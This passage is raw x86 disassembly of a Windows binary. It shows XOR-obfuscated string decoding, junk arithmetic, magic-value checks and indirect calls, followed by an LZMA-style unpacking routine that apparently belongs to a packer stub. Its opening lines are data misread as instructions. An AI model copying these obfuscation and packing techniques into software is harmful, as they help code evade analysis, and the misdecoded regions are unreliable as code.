  418eff:	add    BYTE PTR [eax],al
  418f01:	add    BYTE PTR [ecx+edi*2+0x6e],al
  418f05:	popa   
  418f06:	ins    DWORD PTR es:[edi],dx
  418f07:	imul   ebp,DWORD PTR [ecx+0x43],0x747361
  418f0e:	aas    
  418f0f:	inc    edi
  418f10:	gs je  0x418f68
  418f13:	jae    0x418f7a
  418f15:	jb     0x418f66
  418f17:	bound  ebp,QWORD PTR [edx+0x65]
  418f1a:	arpl   WORD PTR [ebx+edx*2+0x65],si
  418f1e:	arpl   WORD PTR [ebp+0x72],si
  418f21:	imul   esi,DWORD PTR [ecx+edi*2+0x47],0x73557465
  418f29:	gs jb  0x418f7b
  418f2c:	bound  ebp,QWORD PTR [edx+0x65]
  418f2f:	arpl   WORD PTR [ebx+edx*2+0x65],si
  418f33:	arpl   WORD PTR [ebp+0x0],si
  418f36:	nop
  418f37:	inc    edx
  418f38:	add    BYTE PTR [eax+edx*4],al
  418f3b:	inc    edx
  418f3c:	add    BYTE PTR [eax],cl
  418f3e:	nop
  418f3f:	inc    edx
  418f40:	add    BYTE PTR [eax+edx*4],cl
  418f43:	inc    edx
  418f44:	add    BYTE PTR [eax],dl
  418f46:	nop
  418f47:	inc    edx
  418f48:	add    BYTE PTR [eax+edx*4],dl
  418f4b:	inc    edx
  418f4c:	add    BYTE PTR [eax],bl
  418f4e:	nop
  418f4f:	inc    edx
  418f50:	add    BYTE PTR [eax+edx*4],bl
  418f53:	inc    edx
  418f54:	add    BYTE PTR [eax],ah
  418f56:	nop
  418f57:	inc    edx
  418f58:	add    BYTE PTR [eax+edx*4],ah
  418f5b:	inc    edx
  418f5c:	add    BYTE PTR [eax],ch
  418f5e:	nop
  418f5f:	inc    edx
  418f60:	add    BYTE PTR [eax],al
  418f62:	mov    al,0x42
  418f64:	add    BYTE PTR [eax+esi*4],al
  418f67:	inc    edx
  418f68:	add    BYTE PTR [eax],cl
  418f6a:	mov    al,0x42
  418f6c:	add    BYTE PTR [eax+esi*4],cl
  418f6f:	inc    edx
  418f70:	add    BYTE PTR [eax],dl
  418f72:	mov    al,0x42
  418f74:	add    BYTE PTR [eax+esi*4],dl
  418f77:	inc    edx
  418f78:	add    BYTE PTR [eax],bl
  418f7a:	mov    al,0x42
  418f7c:	add    BYTE PTR [eax+esi*4],bl
  418f7f:	inc    edx
  418f80:	add    BYTE PTR [eax],al
  418f82:	rol    BYTE PTR [edx+0x0],0x4
  418f86:	rol    BYTE PTR [edx+0x0],0x8
  418f8a:	rol    BYTE PTR [edx+0x0],0xc
  418f8e:	rol    BYTE PTR [edx+0x0],0x10
  418f92:	rol    BYTE PTR [edx+0x0],0x14
  418f96:	rol    BYTE PTR [edx+0x0],0x18
  418f9a:	rol    BYTE PTR [edx+0x0],0x1c
  418f9e:	rol    BYTE PTR [edx+0x0],0x0
	...
  418fae:	add    BYTE PTR [eax],al
  418fb0:	push   edx
  418fb1:	push   ebx
  418fb2:	inc    esp
  418fb3:	push   ebx
  418fb4:	or     BYTE PTR [eax+0x4e],bh
  418fb7:	icebp  
  418fb8:	and    ebp,edx
  418fba:	addr16 inc edi
  418fbc:	mov    ecx,0x5404ae1e
  418fc1:	mov    eax,0x1faf0
  418fc6:	add    BYTE PTR [eax],al
  418fc8:	inc    ebx
  418fc9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  418fcd:	jb     0x419041
  418fcf:	outs   dx,BYTE PTR gs:[esi]
  418fd1:	je     0x419017
  418fd3:	popa   
  418fd4:	je     0x419037
  418fd6:	pop    esp
  418fd7:	dec    ebp
  418fd8:	outs   dx,DWORD PTR ds:[esi]
  418fd9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  418fe1:	ins    BYTE PTR es:[edi],dx
  418fe2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  418fe9:	dec    esi
  418fea:	gs ja  0x418fed
  418fed:	mov    edx,DWORD PTR [ebp-0x14]
  418ff0:	sub    esp,0xe4
  418ff6:	push   ebx
  418ff7:	mov    eax,ebx
  418ff9:	xchg   ecx,eax
  418ffa:	mov    eax,DWORD PTR [ebp+0x8]
  418ffd:	cmp    eax,0xf89c85b9
  419002:	jne    0x419394
  419008:	mov    eax,DWORD PTR [ebp+0xc]
  41900b:	cmp    eax,0xf89c85b8
  419010:	jne    0x419394
  419016:	mov    eax,DWORD PTR [ebp+0x24]
  419019:	mov    DWORD PTR [ebp-0x4],eax
  41901c:	mov    BYTE PTR [ebp-0x18],0x3
  419020:	mov    BYTE PTR [ebp-0x17],0x1e
  419024:	mov    BYTE PTR [ebp-0x16],0x1
  419028:	mov    BYTE PTR [ebp-0x15],0x4f
  41902c:	mov    BYTE PTR [ebp-0x14],0x48
  419030:	mov    BYTE PTR [ebp-0x13],0x7a
  419034:	mov    BYTE PTR [ebp-0x20],0xd
  419038:	mov    BYTE PTR [ebp-0x1f],0xf
  41903c:	mov    BYTE PTR [ebp-0x1e],0x1d
  419040:	mov    BYTE PTR [ebp-0x1d],0x8
  419044:	mov    BYTE PTR [ebp-0x1c],0x4f
  419048:	mov    BYTE PTR [ebp-0x1b],0x48
  41904c:	mov    BYTE PTR [ebp-0x1a],0x7a
  419050:	mov    BYTE PTR [ebp-0x28],0xf
  419054:	mov    BYTE PTR [ebp-0x27],0x2
  419058:	push   esi
  419059:	mov    BYTE PTR [ebp-0x26],0x6
  41905d:	mov    BYTE PTR [ebp-0x25],0xf3
  419061:	push   edi
  419062:	mov    BYTE PTR [ebp-0x24],0x19
  419066:	mov    BYTE PTR [ebp-0x23],0xa
  41906a:	push   0x73
  41906c:	mov    BYTE PTR [ebp-0x22],0x1
  419070:	xor    edi,edi
  419072:	mov    BYTE PTR [ebp-0x21],0x7a
  419076:	xor    esi,esi
  419078:	pop    edx
  419079:	mov    eax,0xf7
  41907e:	lea    ecx,[ebp+esi*1-0x18]
  419082:	movzx  ebx,BYTE PTR [ecx]
  419085:	xor    ebx,edx
  419087:	add    ebx,eax
  419089:	inc    esi
  41908a:	mov    BYTE PTR [ecx],bl
  41908c:	cmp    esi,0x6
  41908f:	jb     0x41907e
  419091:	xor    esi,esi
  419093:	lea    ecx,[ebp+esi*1-0x20]
  419097:	movzx  ebx,BYTE PTR [ecx]
  41909a:	xor    ebx,edx
  41909c:	add    ebx,eax
  41909e:	inc    esi
  41909f:	mov    BYTE PTR [ecx],bl
  4190a1:	cmp    esi,0x7
  4190a4:	jb     0x419093
  4190a6:	xor    esi,esi
  4190a8:	lea    ecx,[ebp+esi*1-0x28]
  4190ac:	movzx  ebx,BYTE PTR [ecx]
  4190af:	xor    ebx,edx
  4190b1:	add    ebx,eax
  4190b3:	push   0x8
  4190b5:	mov    BYTE PTR [ecx],bl
  4190b7:	inc    esi
  4190b8:	pop    ecx
  4190b9:	cmp    esi,ecx
  4190bb:	jb     0x4190a8
  4190bd:	lea    eax,[ebp-0x2c]
  4190c0:	mov    DWORD PTR [ebp-0x8],eax
  4190c3:	mov    esi,DWORD PTR [ebp-0x8]
  4190c6:	mov    eax,0x7113fcef
  4190cb:	mov    DWORD PTR [esi],eax
  4190cd:	mov    esi,DWORD PTR [ebp-0x2c]
  4190d0:	cmp    esi,eax
  4190d2:	jne    0x4190e2
  4190d4:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  4190db:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  4190e2:	mov    eax,DWORD PTR [ebp-0x4]
  4190e5:	mov    eax,DWORD PTR [eax+0x18c]
  4190eb:	cmp    DWORD PTR [eax],edi
  4190ed:	jne    0x41933d
  4190f3:	mov    eax,DWORD PTR [ebp-0x4]
  4190f6:	mov    eax,DWORD PTR [eax+0x17c]
  4190fc:	mov    DWORD PTR [eax],edi
  4190fe:	mov    eax,DWORD PTR [ebp-0x4]
  419101:	mov    eax,DWORD PTR [eax+0x180]
  419107:	mov    DWORD PTR [eax],edi
  419109:	mov    edi,0x4e3c
  41910e:	mov    eax,0x4f8f
  419113:	mov    WORD PTR [ebp-0x78],ax
  419117:	mov    eax,edi
  419119:	mov    WORD PTR [ebp-0x76],ax
  41911d:	add    eax,0x43
  419120:	mov    WORD PTR [ebp-0x74],ax
  419124:	lea    eax,[edi+0x3]
  419127:	mov    WORD PTR [ebp-0x72],ax
  41912b:	mov    eax,0x4fac
  419130:	mov    WORD PTR [ebp-0x70],ax
  419134:	lea    eax,[edi-0x4]
  419137:	mov    WORD PTR [ebp-0x6e],ax
  41913b:	add    eax,0x45
  41913e:	mov    WORD PTR [ebp-0x6c],ax
  419142:	lea    eax,[edi-0x2]
  419145:	mov    WORD PTR [ebp-0x6a],ax
  419149:	mov    eax,edi
  41914b:	mov    WORD PTR [ebp-0x68],ax
  41914f:	dec    eax
  419150:	mov    WORD PTR [ebp-0x66],ax
  419154:	mov    eax,0x99ff
  419159:	mov    WORD PTR [ebp-0x64],ax
  41915d:	mov    eax,0x8288
  419162:	mov    WORD PTR [ebp-0x62],ax
  419166:	mov    eax,0xd78d
  41916b:	mov    WORD PTR [ebp-0x60],ax
  41916f:	add    eax,0x1c
  419172:	mov    WORD PTR [ebp-0x5e],ax
  419176:	mov    eax,0x27aa
  41917b:	mov    WORD PTR [ebp-0x5c],ax
  41917f:	mov    eax,0x47aa
  419184:	mov    WORD PTR [ebp-0x5a],ax
  419188:	lea    eax,[edi-0x3]
  41918b:	mov    WORD PTR [ebp-0x58],ax
  41918f:	mov    DWORD PTR [ebp-0x10],0xf306020f
  419196:	mov    DWORD PTR [ebp-0xc],0x7a010a19
  41919d:	lea    eax,[ebp-0x10]
  4191a0:	mov    bl,BYTE PTR [eax]
  4191a2:	xor    bl,dl
  4191a4:	sub    bl,0x9
  4191a7:	mov    BYTE PTR [eax],bl
  4191a9:	inc    eax
  4191aa:	dec    ecx
  4191ab:	jne    0x4191a0
  4191ad:	lea    eax,[ebp-0x10]
  4191b0:	mov    DWORD PTR [ebp-0xb8],eax
  4191b6:	lea    eax,[ebp-0xbc]
  4191bc:	push   eax
  4191bd:	mov    eax,DWORD PTR [ebp+0xc]
  4191c0:	mov    ebx,0x7510899
  4191c5:	xor    eax,ebx
  4191c7:	mov    esi,0x3272e0
  4191cc:	add    eax,esi
  4191ce:	push   eax
  4191cf:	mov    eax,DWORD PTR [ebp-0x4]
  4191d2:	add    eax,0x66
  4191d5:	push   eax
  4191d6:	mov    eax,DWORD PTR [ebp-0x4]
  4191d9:	mov    eax,DWORD PTR [eax+0x198]
  4191df:	mov    DWORD PTR [ebp-0xbc],0x1
  4191e9:	push   DWORD PTR [eax]
  4191eb:	mov    eax,DWORD PTR [ebp+0x10]
  4191ee:	call   eax
  4191f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f3:	xor    ecx,ebx
  4191f5:	add    ecx,esi
  4191f7:	mov    DWORD PTR [ebp-0x8],eax
  4191fa:	cmp    eax,ecx
  4191fc:	jne    0x419217
  4191fe:	mov    eax,ds:0x33730bee
  419203:	or     eax,0x22150bef
  419208:	mov    ds:0x33730bee,eax
  41920d:	add    eax,0x3372e90f
  419212:	mov    ds:0x33730bee,eax
  419217:	mov    ecx,0x4f84
  41921c:	mov    eax,ecx
  41921e:	mov    WORD PTR [ebp-0x40],ax
  419222:	mov    eax,0x4e71
  419227:	mov    edx,eax
  419229:	mov    WORD PTR [ebp-0x3e],dx
  41922d:	lea    edx,[ecx+0x15]
  419230:	mov    WORD PTR [ebp-0x3c],dx
  419234:	add    edx,0xfffffff8
  419237:	mov    WORD PTR [ebp-0x3a],dx
  41923b:	lea    edx,[ecx+0xf]
  41923e:	mov    WORD PTR [ebp-0x38],dx
  419242:	add    edx,0x1b
  419245:	mov    WORD PTR [ebp-0x36],dx
  419249:	lea    edx,[ecx+0x21]
  41924c:	mov    WORD PTR [ebp-0x34],dx
  419250:	mov    WORD PTR [ebp-0x32],cx
  419254:	mov    ecx,edi
  419256:	mov    WORD PTR [ebp-0x30],cx
  41925a:	lea    ecx,[edx-0x1]
  41925d:	mov    edx,ecx
  41925f:	mov    WORD PTR [ebp-0x54],dx
  419263:	mov    edx,eax
  419265:	mov    WORD PTR [ebp-0x52],dx
  419269:	add    edx,0x8
  41926c:	mov    WORD PTR [ebp-0x50],dx
  419270:	mov    WORD PTR [ebp-0x4e],ax
  419274:	add    eax,0x2
  419277:	mov    WORD PTR [ebp-0x4c],ax
  41927b:	lea    eax,[ecx-0x16]
  41927e:	mov    WORD PTR [ebp-0x4a],ax
  419282:	add    eax,0xfffffff7
  419285:	mov    WORD PTR [ebp-0x48],ax
  419289:	mov    WORD PTR [ebp-0x46],cx
  41928d:	mov    WORD PTR [ebp-0x44],di
  419291:	mov    eax,DWORD PTR [ebp+0x8]
  419294:	movzx  ecx,WORD PTR [ebp-0x54]
  419298:	xor    eax,ebx
  41929a:	add    eax,esi
  41929c:	xor    eax,ecx
  41929e:	mov    WORD PTR [ebp-0x54],ax
  4192a2:	mov    eax,DWORD PTR [ebp+0x8]
  4192a5:	movzx  ecx,WORD PTR [ebp-0x40]
  4192a9:	xor    eax,ebx
  4192ab:	add    eax,esi
  4192ad:	xor    eax,ecx
  4192af:	mov    WORD PTR [ebp-0x40],ax
  4192b3:	xor    eax,eax
  4192b5:	mov    WORD PTR [ebp-0xd0],ax
  4192bc:	mov    WORD PTR [ebp-0xe4],ax
  4192c3:	mov    edi,DWORD PTR [ebp+0x24]
  4192c6:	lea    eax,[ebp-0xd0]
  4192cc:	lea    edx,[ebp-0x54]
  4192cf:	mov    DWORD PTR [ebp-0xbc],0x2
  4192d9:	mov    DWORD PTR [ebp-0xb8],eax
  4192df:	call   0x41bcc3
  4192e4:	mov    DWORD PTR [ebp-0xb4],eax
  4192ea:	lea    eax,[ebp-0xbc]
  4192f0:	push   eax
  4192f1:	mov    eax,DWORD PTR [ebp+0xc]
  4192f4:	xor    eax,ebx
  4192f6:	add    eax,esi
  4192f8:	push   eax
  4192f9:	lea    eax,[ebp-0x78]
  4192fc:	push   eax
  4192fd:	push   DWORD PTR [ebp-0x8]
  419300:	mov    eax,DWORD PTR [ebp+0x10]
  419303:	call   eax
  419305:	mov    edi,DWORD PTR [ebp+0x24]
  419308:	lea    eax,[ebp-0xe4]
  41930e:	lea    edx,[ebp-0x40]
  419311:	mov    DWORD PTR [ebp-0xb8],eax
  419317:	call   0x41bcc3
  41931c:	mov    DWORD PTR [ebp-0xb4],eax
  419322:	lea    eax,[ebp-0xbc]
  419328:	push   eax
  419329:	mov    eax,DWORD PTR [ebp+0xc]
  41932c:	xor    eax,ebx
  41932e:	add    eax,esi
  419330:	push   eax
  419331:	lea    eax,[ebp-0x78]
  419334:	push   eax
  419335:	push   DWORD PTR [ebp-0x8]
  419338:	mov    eax,DWORD PTR [ebp+0x10]
  41933b:	call   eax
  41933d:	mov    eax,DWORD PTR [ebp+0x14]
  419340:	push   DWORD PTR [ebp-0x4]
  419343:	push   DWORD PTR [ebp+0x20]
  419346:	push   DWORD PTR [ebp+0x1c]
  419349:	push   DWORD PTR [ebp+0x18]
  41934c:	push   DWORD PTR [ebp+0x10]
  41934f:	push   DWORD PTR [ebp+0x8]
  419352:	push   DWORD PTR [ebp+0xc]
  419355:	call   0x41a4ec
  41935a:	add    DWORD PTR [ebp-0x4],eax
  41935d:	mov    eax,DWORD PTR [ebp-0x4]
  419360:	mov    eax,DWORD PTR [ebp-0x4]
  419363:	mov    edi,DWORD PTR [eax+0x190]
  419369:	mov    eax,DWORD PTR [ebp-0x4]
  41936c:	mov    eax,DWORD PTR [eax+0x18c]
  419372:	mov    esi,DWORD PTR [eax]
  419374:	lea    ecx,[ebp+0x4]
  419377:	mov    edx,DWORD PTR [ecx]
  419379:	cmp    edx,esi
  41937b:	jb     0x419392
  41937d:	mov    eax,DWORD PTR [edi]
  41937f:	mov    edi,DWORD PTR [eax+0x3c]
  419382:	mov    edi,DWORD PTR [edi+eax*1+0x50]
  419386:	add    edi,esi
  419388:	cmp    edx,edi
  41938a:	jae    0x419392
  41938c:	sub    eax,esi
  41938e:	add    eax,edx
  419390:	mov    DWORD PTR [ecx],eax
  419392:	pop    edi
  419393:	pop    esi
  419394:	pop    ebx
  419395:	leave  
  419396:	ret    0x20
  419399:	push   edi
  41939a:	push   esi
  41939b:	push   ebx
  41939c:	push   ebp
  41939d:	mov    ebp,esp
  41939f:	mov    eax,DWORD PTR [ebp+0x24]
  4193a2:	add    DWORD PTR [ebp+0x28],eax
  4193a5:	push   eax
  4193a6:	cld    
  4193a7:	mov    esi,DWORD PTR [ebp+0x18]
  4193aa:	add    DWORD PTR [ebp+0x1c],esi
  4193ad:	push   esi
  4193ae:	mov    esi,DWORD PTR [ebp+0x14]
  4193b1:	lods   eax,DWORD PTR ds:[esi]
  4193b2:	xchg   edx,eax
  4193b3:	push   edx
  4193b4:	mov    cl,BYTE PTR [esi-0x2]
  4193b7:	or     eax,0xffffffff
  4193ba:	shl    eax,cl
  4193bc:	not    eax
  4193be:	push   eax
  4193bf:	mov    cl,dh
  4193c1:	or     eax,0xffffffff
  4193c4:	shl    eax,cl
  4193c6:	not    eax
  4193c8:	push   eax
  4193c9:	add    cl,dl
  4193cb:	mov    edi,esi
  4193cd:	sub    esp,0xc
  4193d0:	sub    eax,eax
  4193d2:	inc    eax
  4193d3:	push   eax
  4193d4:	push   eax
  4193d5:	push   eax
  4193d6:	push   eax
  4193d7:	push   eax
  4193d8:	push   edi
  4193d9:	sub    esi,esi
  4193db:	push   esi
  4193dc:	or     ebx,0xffffffff
  4193df:	mov    eax,0x300
  4193e4:	shl    eax,cl
  4193e6:	lea    ecx,[eax+0x736]
  4193ec:	mov    eax,0x4000400
  4193f1:	shr    ecx,1
  4193f3:	rep stos DWORD PTR es:[edi],eax
  4193f5:	push   0x5
  4193f7:	pop    ecx
  4193f8:	call   0x4196e3
  4193fd:	loop   0x4193f8
  4193ff:	lea    esi,[esi]
  419401:	lea    edi,[edi]
  419403:	mov    edi,DWORD PTR [ebp-0x4]
  419406:	mov    eax,DWORD PTR [ebp-0x10]
  419409:	sub    edi,DWORD PTR [ebp+0x24]
  41940c:	and    eax,edi
  41940e:	mov    DWORD PTR [ebp-0x18],eax
  419411:	mov    al,0x0
  419413:	call   0x4196fb
  419418:	jne    0x4194b3
  41941e:	mov    cl,BYTE PTR [ebp-0xc]
  419421:	and    edi,DWORD PTR [ebp-0x14]
  419424:	shl    edi,cl
  419426:	sub    cl,0x8
  419429:	neg    cl
  41942b:	shr    esi,cl
  41942d:	pop    eax
  41942e:	add    edi,esi
  419430:	pop    esi
  419431:	lea    edi,[edi+edi*2]
  419434:	shl    edi,0x8
  419437:	cmp    al,0x7
  419439:	pop    edx
  41943a:	lea    ecx,[esi+edi*2+0xe6c]
  419441:	push   ecx
  419442:	push   esi
  419443:	mov    esi,0x100
  419448:	push   eax
  419449:	mov    al,0x1
  41944b:	jb     0x419481
  41944d:	mov    edi,DWORD PTR [ebp-0x4]
  419450:	sub    edi,DWORD PTR [ebp-0x24]
  419453:	movzx  edi,BYTE PTR [edi]
  419456:	mov    ebp,DWORD PTR [ebp-0x34]
  419459:	shl    edi,1
  41945b:	mov    ecx,esi
  41945d:	and    esi,edi
  41945f:	add    ecx,esi
  419461:	lea    ebp,[ebp+ecx*2+0x0]
  419465:	call   0x41971a
  41946a:	mov    ecx,eax
  41946c:	shr    esi,0x8
  41946f:	and    ecx,0x1
  419472:	cmp    esi,ecx
  419474:	mov    esi,0x100
  419479:	jne    0x419489
  41947b:	cmp    eax,esi
  41947d:	jb     0x419456
  41947f:	jmp    0x419495
  419481:	mov    ebp,DWORD PTR [ebp-0x34]
  419484:	call   0x41971a
  419489:	inc    eax
  41948a:	inc    esi
  41948b:	sub    eax,0x1
  41948e:	sub    esi,0x1
  419491:	cmp    eax,esi
  419493:	jb     0x419481
  419495:	pop    edx
  419496:	inc    edx
  419497:	cmp    edx,0x5
  41949a:	dec    edx
  41949b:	mov    ecx,edx
  41949d:	jb     0x4194ae
  41949f:	inc    edx
  4194a0:	cmp    edx,0xb
  4194a3:	dec    edx
  4194a4:	mov    cl,0x4
  4194a6:	dec    cl
  4194a8:	jb     0x4194ae
  4194aa:	mov    cl,0x7
  4194ac:	dec    cl
  4194ae:	sub    edx,ecx
  4194b0:	push   edx
  4194b1:	jmp    0x419502
  4194b3:	mov    al,0xc1
  4194b5:	dec    al
  4194b7:	call   0x41970b
  4194bc:	jne    0x4194d2
  4194be:	pop    eax
  4194bf:	pop    edi
  4194c0:	pop    edx
  4194c1:	pop    ecx
  4194c2:	pop    edx
  4194c3:	pop    ecx
  4194c4:	push   DWORD PTR [esp]
  4194c7:	push   ecx
  4194c8:	push   edx
  4194c9:	mov    edx,0x664
  4194ce:	mov    cl,0x0
  4194d0:	jmp    0x419545
  4194d2:	mov    al,0xcd
  4194d4:	dec    al
  4194d6:	call   0x41970b
  4194db:	jne    0x41950b
  4194dd:	mov    al,0xf1
  4194df:	dec    al
  4194e1:	call   0x4196fb
  4194e6:	jne    0x41953b
  4194e8:	pop    eax
  4194e9:	cmp    al,0x7
  4194eb:	mov    al,0x9
  4194ed:	jb     0x4194f1
  4194ef:	mov    al,0xb
  4194f1:	push   eax
  4194f2:	mov    esi,DWORD PTR [ebp-0x4]
  4194f5:	sub    esi,DWORD PTR [ebp-0x24]
  4194f8:	cmp    esi,DWORD PTR [ebp+0x24]
  4194fb:	jb     0x4196d2
  419501:	lods   al,BYTE PTR ds:[esi]
  419502:	mov    edi,DWORD PTR [ebp-0x4]
  419505:	stos   BYTE PTR es:[edi],al
  419506:	jmp    0x419699
  41950b:	mov    al,0xd8
  41950d:	call   0x41970b
  419512:	mov    esi,DWORD PTR [ebp-0x28]
  419515:	je     0x419532
  419517:	mov    al,0xe4
  419519:	call   0x41970b
  41951e:	mov    esi,DWORD PTR [ebp-0x2c]
  419521:	je     0x41952c
  419523:	mov    esi,DWORD PTR [ebp-0x30]
  419526:	mov    ecx,DWORD PTR [ebp-0x2c]
  419529:	mov    DWORD PTR [ebp-0x30],ecx
  41952c:	mov    ecx,DWORD PTR [ebp-0x28]
  41952f:	mov    DWORD PTR [ebp-0x2c],ecx
  419532:	mov    ecx,DWORD PTR [ebp-0x24]
  419535:	mov    DWORD PTR [ebp-0x28],ecx
  419538:	mov    DWORD PTR [ebp-0x24],esi
  41953b:	pop    eax
  41953c:	pop    edi
  41953d:	pop    ecx
  41953e:	mov    edx,0xa68
  419543:	mov    cl,0x8
  419545:	add    edx,edi
  419547:	push   edx
  419548:	push   edi
  419549:	cmp    al,0x7
  41954b:	mov    al,cl
  41954d:	jb     0x419551
  41954f:	add    al,0x3
  419551:	push   eax
  419552:	mov    ebp,DWORD PTR [ebp-0x34]
  419555:	call   0x419718
  41955a:	jne    0x419570
  41955c:	mov    eax,DWORD PTR [ebp-0x18]
  41955f:	mov    edi,DWORD PTR [ebp-0x34]
  419562:	shl    eax,0x3
  419565:	sub    ecx,ecx
  419567:	push   0x8
  419569:	pop    esi
  41956a:	lea    edi,[edi+eax*2+0x4]
  41956e:	jmp    0x4195a5
  419570:	mov    ebp,DWORD PTR [ebp-0x34]
  419573:	add    ebp,0x2
  419576:	call   0x419718
  41957b:	jne    0x419595
  41957d:	mov    eax,DWORD PTR [ebp-0x18]
  419580:	mov    edi,DWORD PTR [ebp-0x34]
  419583:	shl    eax,0x3
  419586:	push   0x8
  419588:	pop    ecx
  419589:	push   0x8
  41958b:	pop    esi
  41958c:	lea    edi,[edi+eax*2+0x104]
  419593:	jmp    0x4195a5
  419595:	mov    edi,0x204
  41959a:	add    edi,DWORD PTR [ebp-0x34]
  41959d:	push   0x10
  41959f:	pop    ecx
  4195a0:	mov    esi,0x100
  4195a5:	mov    DWORD PTR [ebp-0x1c],ecx
  4195a8:	sub    eax,eax
  4195aa:	inc    eax
  4195ab:	mov    ebp,edi
  4195ad:	call   0x41971a
  4195b2:	mov    ecx,eax
  4195b4:	sub    ecx,esi
  4195b6:	jb     0x4195ab
  4195b8:	add    DWORD PTR [ebp-0x1c],ecx
  4195bb:	cmp    DWORD PTR [ebp-0x3c],0x4
  4195bf:	jae    0x419675
  4195c5:	add    DWORD PTR [ebp-0x3c],0x7
  4195c9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4195cc:	cmp    ecx,0x4
  4195cf:	jb     0x4195d4
  4195d1:	push   0x3
  4195d3:	pop    ecx
  4195d4:	mov    edi,DWORD PTR [ebp-0x38]
  4195d7:	shl    ecx,0x6
  4195da:	sub    eax,eax
  4195dc:	inc    eax
  4195dd:	push   0x40
  4195df:	pop    esi
  4195e0:	lea    edi,[edi+ecx*2+0x360]
  4195e7:	mov    ebp,edi
  4195e9:	call   0x41971a
  4195ee:	mov    ecx,eax
  4195f0:	sub    ecx,esi
  4195f2:	jb     0x4195e7
  4195f4:	mov    DWORD PTR [ebp-0x18],ecx
  4195f7:	mov    DWORD PTR [ebp-0x24],ecx
  4195fa:	cmp    ecx,0x4
  4195fd:	jb     0x419672
  4195ff:	mov    esi,ecx
  419601:	and    DWORD PTR [ebp-0x24],0x1
  419605:	shr    esi,1
  419607:	or     DWORD PTR [ebp-0x24],0x2
  41960b:	dec    esi
  41960c:	cmp    ecx,0xe
  41960f:	jae    0x41962a
  419611:	mov    eax,0x2af
  419616:	sub    eax,ecx
  419618:	mov    ecx,esi
  41961a:	shl    BYTE PTR [ebp-0x24],cl
  41961d:	add    eax,DWORD PTR [ebp-0x24]
  419620:	shl    eax,1
  419622:	add    eax,DWORD PTR [ebp-0x38]
  419625:	mov    DWORD PTR [ebp-0x34],eax
  419628:	jmp    0x419657
  41962a:	sub    esi,0x4
  41962d:	call   0x4196d7
  419632:	shr    ebx,1
  419634:	shl    DWORD PTR [ebp-0x24],1
  419637:	cmp    DWORD PTR [ebp-0x20],ebx
  41963a:	jb     0x419642
  41963c:	inc    DWORD PTR [ebp-0x24]
  41963f:	sub    DWORD PTR [ebp-0x20],ebx
  419642:	dec    esi
  419643:	jne    0x41962d
  419645:	mov    eax,0x644
  41964a:	add    eax,DWORD PTR [ebp-0x38]
  41964d:	mov    DWORD PTR [ebp-0x34],eax
  419650:	shl    DWORD PTR [ebp-0x24],0x4
  419654:	push   0x4
  419656:	pop    esi
  419657:	sub    edi,edi
  419659:	inc    edi
  41965a:	mov    eax,edi
  41965c:	mov    ebp,DWORD PTR [ebp-0x34]
  41965f:	call   0x41971a
  419664:	test   al,0x1
  419666:	je     0x41966b
  419668:	or     DWORD PTR [ebp-0x24],edi
  41966b:	shl    edi,1
  41966d:	dec    esi
  41966e:	jne    0x41965c
  419670:	jmp    0x419672
  419672:	inc    DWORD PTR [ebp-0x24]
  419675:	mov    ecx,DWORD PTR [ebp-0x1c]
  419678:	add    ecx,0x2
  41967b:	mov    edi,DWORD PTR [ebp-0x4]
  41967e:	mov    eax,edi
  419680:	sub    eax,DWORD PTR [ebp+0x24]
  419683:	cmp    DWORD PTR [ebp-0x24],eax
  419686:	ja     0x4196d2
  419688:	mov    esi,edi
  41968a:	sub    esi,DWORD PTR [ebp-0x24]
  41968d:	mov    edx,DWORD PTR [ebp+0x28]
  419690:	lods   al,BYTE PTR ds:[esi]
  419691:	stos   BYTE PTR es:[edi],al
  419692:	cmp    edi,edx
  419694:	jae    0x419699
  419696:	dec    ecx
  419697:	jne    0x419690
  419699:	mov    DWORD PTR [ebp-0x4],edi
  41969c:	movzx  esi,al
  41969f:	cmp    edi,DWORD PTR [ebp+0x28]
  4196a2:	jb     0x419403
  4196a8:	call   0x4196d7
  4196ad:	sub    eax,eax
  4196af:	lea    ebp,[esp+0x3c]
  4196b3:	mov    edx,DWORD PTR [ebp+0x20]
  4196b6:	mov    esi,DWORD PTR [ebp-0x8]
  4196b9:	sub    esi,DWORD PTR [ebp+0x18]
  4196bc:	mov    DWORD PTR [edx],esi
  4196be:	mov    edx,DWORD PTR [ebp+0x2c]
  4196c1:	mov    edi,DWORD PTR [ebp-0x4]
  4196c4:	sub    edi,DWORD PTR [ebp+0x24]
  4196c7:	mov    DWORD PTR [edx],edi
  4196c9:	leave  
  4196ca:	pop    ebx
  4196cb:	pop    esi
  4196cc:	pop    edi
  4196cd:	ret    0x1c
  4196d0:	pop    esi
  4196d1:	pop    eax
  4196d2:	sub    eax,eax
  4196d4:	inc    eax
  4196d5:	jmp    0x4196af
  4196d7:	cmp    ebx,0x1000000
  4196dd:	jb     0x4196e0
  4196df:	ret    
  4196e0:	shl    ebx,0x8
  4196e3:	push   esi
  4196e4:	mov    esi,DWORD PTR [ebp-0x8]
  4196e7:	cmp    esi,DWORD PTR [ebp+0x1c]
  4196ea:	jae    0x4196d0
  4196ec:	mov    eax,DWORD PTR [ebp-0x20]
  4196ef:	shl    eax,0x8
  4196f2:	lods   al,BYTE PTR ds:[esi]
  4196f3:	mov    DWORD PTR [ebp-0x20],eax
  4196f6:	mov    DWORD PTR [ebp-0x8],esi
  4196f9:	pop    esi
  4196fa:	ret    
  4196fb:	mov    ecx,DWORD PTR [ebp-0x3c]
  4196fe:	movzx  eax,al
  419701:	shl    ecx,0x4
  419704:	add    eax,DWORD PTR [ebp-0x18]
  419707:	add    eax,ecx
  419709:	jmp    0x419711
  41970b:	movzx  eax,al
  41970e:	add    eax,DWORD PTR [ebp-0x3c]
  419711:	mov    ebp,DWORD PTR [ebp-0x38]
  419714:	lea    ebp,[ebp+eax*2+0x0]
  419718:	sub    eax,eax
  41971a:	lea    ebp,[ebp+eax*2+0x0]
  41971e:	cmp    ebx,0x1000000
  419724:	jae    0x419742
  419726:	mov    ecx,DWORD PTR [esp+0x38]
  41972a:	shl    DWORD PTR [esp+0x20],0x8
  41972f:	cmp    ecx,DWORD PTR [esp+0x5c]
  419733:	jae    0x4196d1
